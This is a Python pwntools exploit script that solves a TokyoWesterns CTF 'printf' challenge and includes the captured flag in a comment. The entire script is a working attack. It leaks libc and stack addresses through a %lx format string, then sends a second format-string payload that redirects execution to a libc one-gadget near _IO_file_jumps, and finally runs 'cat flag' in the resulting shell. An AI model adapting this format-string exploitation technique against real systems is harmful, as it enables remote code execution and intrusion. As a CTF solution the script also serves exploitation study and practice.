#!/usr/bin/env python
from pwn import *
import re

# TWCTF{Pudding_Pudding_Pudding_purintoehu}

context.arch = 'amd64'
e , l = ELF( './printf' ) , ELF( './libc-d7ab015f68cd23c410d57af6552deb54bcb16ff64177c8f2c671902915b75110.so.6' )
y = remote( 'printf.chal.ctf.westerns.tokyo' , 10001 )


fmt = '%lx.' * 0x30 + 'yuawn'
y.sendlineafter( '?' , fmt )

o = y.recvuntil( 'yuawn' ).split('.')
l.address = int( o[1] , 16 ) - 0x1e7580
success( 'libc -> %s' % hex( l.address ) )
stk = int( o[39] , 16 ) - 0x380
success( 'stack -> %s' % hex( stk ) )


off = stk - ( l.address + 0x1e6598 ) + 0x10 # _IO_file_jumps

one = 0x106ef8
fmt = '%{}c'.format( str( off ) ) + 'a'.ljust( 7 , 'a' ) + p64( l.address + one )
y.sendlineafter( '?' , fmt.ljust( 0xff , '\0' ) )

y.sendline( 'cat flag' )

y.interactive()
